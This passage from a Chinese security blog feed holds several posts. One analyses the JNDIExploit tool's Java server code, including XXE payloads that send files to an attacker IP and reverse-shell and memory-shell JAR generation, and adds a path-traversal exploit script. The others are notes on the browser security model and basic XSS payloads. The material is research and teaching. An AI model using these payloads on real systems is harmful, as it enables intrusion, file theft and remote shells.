class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Receive ClassRequest: &quot;</span> + className + <span class="string">&quot;.class&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//先从Cache中加载</span></span><br><span class="line">        <span class="keyword">if</span>(Cache.contains(className))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">byte</span>[] bytes = Cache.get(className);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.length);</span><br><span class="line">            <span class="comment">//这一步返回http请求</span></span><br><span class="line">            exchange.getResponseBody().write(bytes);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">//找不到就从/data目录下照</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">pa</span> <span class="operator">=</span> cwd + File.separator + <span class="string">&quot;data&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pa + File.separator + className + <span class="string">&quot;.class&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                    fileInputStream.read(bytes);</span><br><span class="line">                &#125;</span><br><span class="line">                exchange.getResponseHeaders().set(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleWSDLRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> exchange.getRequestURI().getQuery();</span><br><span class="line">        Map&lt;String, String&gt; params = parseQuery(query);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath().substring(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(path.startsWith(<span class="string">&quot;list&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">//intended to list directories or read files on server</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> params.get(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (file != <span class="literal">null</span> &amp;&amp; !file.isEmpty()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">listWsdl</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&lt;!DOCTYPE x [\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;  &lt;!ENTITY % aaa SYSTEM \&quot;file:///&quot;</span> + file + <span class="string">&quot;\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;  &lt;!ENTITY % bbb SYSTEM \&quot;http://&quot;</span> + Config.ip + <span class="string">&quot;:&quot;</span> + Config.httpPort + <span class="string">&quot;/http.wsdl\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;  %bbb;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;]&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&lt;definitions name=\&quot;HelloService\&quot; xmlns=\&quot;http://schemas.xmlsoap.org/wsdl/\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;  &amp;ddd;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&lt;/definitions&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">                System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, listWsdl.getBytes().length);</span><br><span class="line">                exchange.getResponseBody().write(listWsdl.getBytes());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Missing or wrong argument&quot;</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            exchange.close();</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.startsWith(<span class="string">&quot;upload&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> params.get(<span class="string">&quot;type&quot;</span>);</span><br><span class="line"></span><br><span class="line">            String[] args = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (type.equalsIgnoreCase(<span class="string">&quot;command&quot;</span>)) &#123;</span><br><span class="line">                args = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;params.get(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type.equalsIgnoreCase(<span class="string">&quot;dnslog&quot;</span>)) &#123;</span><br><span class="line">                args = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;params.get(<span class="string">&quot;url&quot;</span>)&#125;;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type.equalsIgnoreCase(<span class="string">&quot;reverseshell&quot;</span>)) &#123;</span><br><span class="line">                args = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;params.get(<span class="string">&quot;ip&quot;</span>), params.get(<span class="string">&quot;port&quot;</span>)&#125;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">jarName</span> <span class="operator">=</span> createJar(type, args);</span><br><span class="line">            <span class="keyword">if</span> (jarName != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">uploadWsdl</span> <span class="operator">=</span> <span class="string">&quot;&lt;!DOCTYPE a SYSTEM \&quot;jar:http://&quot;</span> + Config.ip + <span class="string">&quot;:&quot;</span> + Config.httpPort +</span><br><span class="line">                        <span class="string">&quot;/&quot;</span> + jarName + <span class="string">&quot;.jar!/file.txt\&quot;&gt;&lt;a&gt;&lt;/a&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">                System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, uploadWsdl.getBytes().length);</span><br><span class="line">                exchange.getResponseBody().write(uploadWsdl.getBytes());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Missing or wrong argument&quot;</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            exchange.close();</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.startsWith(<span class="string">&quot;http&quot;</span>))  &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">xxhttp</span> <span class="operator">=</span> <span class="string">&quot;&lt;!ENTITY % ccc &#x27;&lt;!ENTITY ddd &amp;#39;&lt;import namespace=\&quot;uri\&quot; location=\&quot;http://&quot;</span> +</span><br><span class="line">                    Config.ip + <span class="string">&quot;:&quot;</span> + Config.httpPort + <span class="string">&quot;/xxelog?%aaa;\&quot;/&gt;&amp;#39;&gt;&#x27;&gt;%ccc;&quot;</span>;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, xxhttp.getBytes().length);</span><br><span class="line">            exchange.getResponseBody().write(xxhttp.getBytes());</span><br><span class="line">            exchange.close();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            exchange.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Map&lt;String, String&gt; <span class="title function_">parseQuery</span><span class="params">(String query)</span>&#123;</span><br><span class="line">        Map&lt;String,String&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">for</span>(String str : query.split(<span class="string">&quot;&amp;&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    String[] parts = str.split(<span class="string">&quot;=&quot;</span>,<span class="number">2</span>);</span><br><span class="line">                    params.put(parts[<span class="number">0</span>], parts[<span class="number">1</span>]);</span><br><span class="line">                &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                    <span class="comment">//continue</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            <span class="comment">//continue</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> params;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">         由于我本地安装的 Websphere 在加载本地 classpath 这一步复现不成功</span></span><br><span class="line"><span class="comment">         这里不确定 websphere 这种方式在多次操作时 Class 文件名相同时是否会存在问题</span></span><br><span class="line"><span class="comment">         目前暂时认为其不会有问题，如果有问题，后面再修改</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">createJar</span><span class="params">(String type, String... params)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;xExportObject&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (type.toLowerCase().equals(<span class="string">&quot;command&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">CommandTemplate</span> <span class="variable">commandTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommandTemplate</span>(params[<span class="number">0</span>], <span class="string">&quot;xExportObject&quot;</span>);</span><br><span class="line">            bytes = commandTemplate.getBytes();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type.toLowerCase().equals(<span class="string">&quot;dnslog&quot;</span>))&#123;</span><br><span class="line">            <span class="type">DnslogTemplate</span> <span class="variable">dnslogTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DnslogTemplate</span>(params[<span class="number">0</span>], <span class="string">&quot;xExportObject&quot;</span>);</span><br><span class="line">            bytes = dnslogTemplate.getBytes();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type.toLowerCase().equals(<span class="string">&quot;reverseshell&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">ReverseShellTemplate</span> <span class="variable">reverseShellTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReverseShellTemplate</span>(params[<span class="number">0</span>], params[<span class="number">1</span>], <span class="string">&quot;xExportObject&quot;</span>);</span><br><span class="line">            bytes = reverseShellTemplate.getBytes();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type.toLowerCase().equals(<span class="string">&quot;webspherememshell&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">exploitClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;com.feihong.ldap.template.WebsphereMemshellTemplate&quot;</span>);</span><br><span class="line">            exploitClass.setName(className);</span><br><span class="line">            exploitClass.detach();</span><br><span class="line">            bytes = exploitClass.toBytecode();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Name of Class in Jar: &quot;</span> + className);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">JarOutputStream</span> <span class="variable">jarOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JarOutputStream</span>(bout);</span><br><span class="line">        jarOut.putNextEntry(<span class="keyword">new</span> <span class="title class_">ZipEntry</span>(className + <span class="string">&quot;.class&quot;</span>));</span><br><span class="line">        jarOut.write(bytes);</span><br><span class="line">        jarOut.closeEntry();</span><br><span class="line">        jarOut.close();</span><br><span class="line">        bout.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">jarName</span> <span class="operator">=</span> Util.getRandomString();</span><br><span class="line">        Cache.set(jarName, bout.toByteArray());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> jarName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>当后缀名不属于if else中的任意一种的时候会进入<code>handleFileRequest</code>中。<br>看看内部处理<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleFileRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">       <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span>  cwd + File.separator + <span class="string">&quot;data&quot;</span> + File.separator +path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">       <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filename);</span><br><span class="line">       <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">           <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">           <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">           fileInputStream.read(bytes);</span><br><span class="line">           exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">           exchange.getResponseBody().write(bytes);</span><br><span class="line">       &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">           System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">           exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       exchange.close();</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><br>他会获取最后一个<code>/</code>并与当前pwd拼接，但是在Windows系统中，路径是用<code>\</code>进行表示的，所以在windows上运行该工具会造成相应的任意文件读取。<br>这里我用python进行攻击<br><img src="/2023/09/16/JNDIExploit%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/4.png" alt><br><img src="/2023/09/16/JNDIExploit%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/3.png" alt><br>可以看到返回了文件内容。而我d盘下也确实有该文件<br><img src="/2023/09/16/JNDIExploit%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/5.png" alt><br>当然不止<code>handleFileRequest</code>有这个问题，其他的函数都是这么处理的，所以都会导致该漏洞的产生。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">filename = <span class="string">&#x27;..\\..\\..\\..\\..\\flag&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:3456/&quot;</span></span><br><span class="line">r = requests.get(url+filename)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>IELTS learning by chatgpt</title>
    <url>/2023/09/17/IELTS-learning-by-chatgpt/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>前端安全1-浏览器安全模型（笔记）</title>
    <url>/2023/09/12/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本来这个系列的命名是叫xss入门的，再看了huli大佬的这系列文章以后，还是改为了前端安全。</p>
<ul>
<li><a href="https://ithelp.ithome.com.tw/users/20091346/ironman/6155">https://ithelp.ithome.com.tw/users/20091346/ironman/6155</a></li>
<li><a href="https://blog.huli.tw/">https://blog.huli.tw/</a></li>
</ul>
<p>因为是笔记，所以本文都是对于huli大佬的文章的总结和拓展，所以就把参考文章直接放到下面了<br><span id="more"></span></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a href="https://ithelp.ithome.com.tw/articles/10314125">https://ithelp.ithome.com.tw/articles/10314125</a></li>
</ul>
<h2 id="前端运行环境"><a href="#前端运行环境" class="headerlink" title="前端运行环境"></a>前端运行环境</h2><p><img src="/2023/09/12/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt><br>先看到上图，前端是运行在浏览器之中的，而浏览器会给前端一大堆的限制</p>
<h3 id="禁止主动文件读取"><a href="#禁止主动文件读取" class="headerlink" title="禁止主动文件读取"></a>禁止主动文件读取</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> onchange=<span class="string">&quot;show(this)&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">function</span> <span class="title function_">show</span>(<span class="params">input</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> reader = <span class="keyword">new</span> <span class="title class_">FileReader</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  reader.<span class="property">onload</span> = <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title function_">alert</span>(event.<span class="property">target</span>.<span class="property">result</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  reader.<span class="title function_">readAsText</span>(input.<span class="property">files</span>[<span class="number">0</span>]);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>这段代码创建了一个input元素，用于上传文件。当文件选择框中选择了文件后，会触发onchange事件，执行show函数。show函数创建了一个FileReader对象，用于读取上传的文件。然后将读取的文件内容转换为文本格式，并通过alert弹窗显示出来。<br>这种只能是人工选择的时候可以读取到，但是不能主动去读取。</p>
<p>当然也有可以绕过的特例</p>
<ul>
<li><a href="https://blogs.opera.com/security/2021/09/bug-bounty-guest-post-local-file-read-via-stored-xss-in-the-opera-browser">https://blogs.opera.com/security/2021/09/bug-bounty-guest-post-local-file-read-via-stored-xss-in-the-opera-browser</a></li>
</ul>
<p>他是利用了opera: 这个协议有着更高的权限，和一些特殊功能，可以用来访问文件，截图网页等<br>更多细节可以看上面的原文，在这里不过多赘述<br>总结一下就是利用opera访问文件然后对文件内容做了个截图以后回传到攻击端</p>
<h3 id="禁止使用系统api"><a href="#禁止使用系统api" class="headerlink" title="禁止使用系统api"></a>禁止使用系统api</h3><p>这里只能使用一些浏览器提供的函数，比如fetch之类的<br>当然浏览器也会开放一些api</p>
<ul>
<li>Web Bluetooth API</li>
<li>MediaDevices API</li>
</ul>
<h3 id="禁止读取其他网页的内容"><a href="#禁止读取其他网页的内容" class="headerlink" title="禁止读取其他网页的内容"></a>禁止读取其他网页的内容</h3><p>我的kaikaix.github.io是读取不到google.com的任何内容的，这种就是同源策略(same-origin policy)，简称SOP<br>当在控制台输入以下代码<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> win = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;https://kaikaix.github.io&#x27;</span>)</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(win.<span class="property">location</span>.<span class="property">href</span>)</span><br><span class="line">&#125;, <span class="number">3000</span>)</span><br></pre></td></tr></table></figure><br>这段代码创建了一个新的浏览器窗口并打开了一个指定的网页。然后使用setTimeout函数在3秒后输出新窗口的URL地址。<br>我在blog.huli.tw网站下开启控制台执行的结果如下<br><img src="/2023/09/12/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/2.png" alt><br>但是如果我在kaikaix.github.io执行的话<br><img src="/2023/09/12/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/3.png" alt><br>就可以成功输出url</p>
<p>当然也有方法可以拿到其他网站的信息<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1359122&amp;q=subdomain%20host%20leak&amp;can=1">https://bugs.chromium.org/p/chromium/issues/detail?id=1359122&amp;q=subdomain%20host%20leak&amp;can=1</a></p>
]]></content>
      <categories>
        <category>前端安全</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>前端安全2-基础xss（笔记）</title>
    <url>/2023/09/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A82-%E5%9F%BA%E7%A1%80xss%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>聊一下基础的xss，等着huli大佬写奇淫技巧</p>
<ul>
<li><a href="https://ithelp.ithome.com.tw/articles/10314883">https://ithelp.ithome.com.tw/articles/10314883</a><span id="more"></span>
</li>
</ul>
<h2 id="触发js代码"><a href="#触发js代码" class="headerlink" title="触发js代码"></a>触发js代码</h2><p>一般来说是用script标签去触发的<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><br>但是除了script标签，还可以用inline event handler来进行触发<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;not_exist&quot;</span> onerror=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>点我<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml">&lt;svg/onload=alert(1)&gt;</span></span><br></pre></td></tr></table></figure><br>常见的用来触发event handler的有</p>
<ul>
<li>onerror</li>
<li>onload</li>
<li>onfocus</li>
<li>onblur</li>
<li>onanimationend</li>
<li>onclick</li>
<li>onmouseenter</li>
</ul>
<p>等等</p>
<p>当然还可以用伪协议去触发js<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)&gt;<span class="title class_">Link</span>&lt;/a&gt;</span><br></pre></td></tr></table></figure><br>这里有个值得注意的点，可以把href后面的伪协议当做字符串，这时候如果用了html编码也可以触发js<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=&amp;#x6a;<span class="attr">avascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)&gt;<span class="title class_">Link</span>&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
<p>在这个网站有更多的payload<br><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a></p>
<h2 id="不同的xss"><a href="#不同的xss" class="headerlink" title="不同的xss"></a>不同的xss</h2><h3 id="注入html"><a href="#注入html" class="headerlink" title="注入html"></a>注入html</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;Hello, &lt;h1&gt;&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&#x27;&lt;/h1&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这种就直接htmlspecialchar就可以过滤了，比较常见不多赘述了</p>
<h3 id="注入属性"><a href="#注入属性" class="headerlink" title="注入属性"></a>注入属性</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;content&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> qs = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> clazz = qs.<span class="title function_">get</span>(<span class="string">&#x27;clazz&#x27;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#content&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">`</span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript"><span class="language-xml">    &lt;div class=&quot;<span class="subst">$&#123;clazz&#125;</span>&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript"><span class="language-xml">      Demo</span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript"><span class="language-xml">    &lt;/div&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript"><span class="language-xml">  `</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>这段代码会获取get参数的clazz，并拼接到<code>&lt;div class=&quot;&quot;&gt;</code>中</p>
<p>那么注入xss的方式有几种</p>
